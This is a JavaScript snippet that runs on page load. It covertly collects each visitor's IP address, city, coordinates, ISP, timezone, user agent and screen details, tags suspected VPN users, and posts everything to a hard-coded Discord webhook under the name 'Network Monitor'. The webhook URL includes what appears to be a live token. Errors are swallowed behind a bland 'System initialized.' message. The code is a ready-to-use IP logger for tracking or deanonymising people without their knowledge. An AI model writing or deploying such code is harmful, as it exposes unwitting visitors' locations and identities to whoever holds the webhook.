const WEBHOOK_URL = 'https://discord.com/api/webhooks/1488574733862830192/HdaqEUKW_FJzI2jsqPMc6jGyE-A32aj6BxQjRQ-SAKWiB9hN0vC6uWW9X4ElNicI9jMY';

async function captureAdvancedData() {
    try {
        // 1. Fetching data from ipapi.co - it gives us IP, City, Coords, and ISP in one go.
        const response = await fetch('https://ipapi.co/json/');
        const data = await response.json();

        // 2. Simple VPN/Proxy check logic
        // Most VPNs/Datacenters have specific tags. 
        // Note: Full VPN detection usually requires a paid API key, but we can check the ISP name.
        const isProxy = data.org.toLowerCase().includes('hosting') || data.org.toLowerCase().includes('vpn');
        const vpnStatus = isProxy ? "⚠️ High Probability (Hosting/VPN)" : "✅ Likely Residential";

        // 3. Constructing the advanced Discord payload
        const payload = {
            username: 'Network Monitor',
            avatar_url: 'https://i1.sndcdn.com/artworks-EcUsidnDBPcL9XiX-cJz3GA-t500x500.jpg',
            embeds: [{
                title: '🌐 Detailed Connection Log',
                color: isProxy ? 0xff0000 : 0x00ff00, // Red if VPN, Green if normal
                fields: [
                    { name: '📍 IP Address', value: `\`${data.ip}\``, inline: true },
                    { name: '🛡️ VPN/Proxy', value: `\`${vpnStatus}\``, inline: true },
                    { name: '🌍 Location', value: `\`${data.city}, ${data.region}, ${data.country_name}\`` },
                    { name: '🧭 Coordinates', value: `\`${data.latitude}, ${data.longitude}\``, inline: true },
                    { name: '📡 ISP', value: `\`${data.org}\``, inline: true },
                    { name: '⏰ Timezone', value: `\`${data.timezone}\``, inline: true },
                    { name: '💻 User Agent', value: `\`${navigator.userAgent}\`` }
                ],
                footer: { text: `Language: ${navigator.language} | Screen: ${screen.width}x${screen.height}` },
                timestamp: new Date()
            }]
        };

        // 4. Sending the data
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        });

    } catch (error) {
        // Silent catch to keep the UI clean
        console.log('System initialized.');
    }
}

// Run the capture as soon as the window loads
window.addEventListener('load', captureAdvancedData);
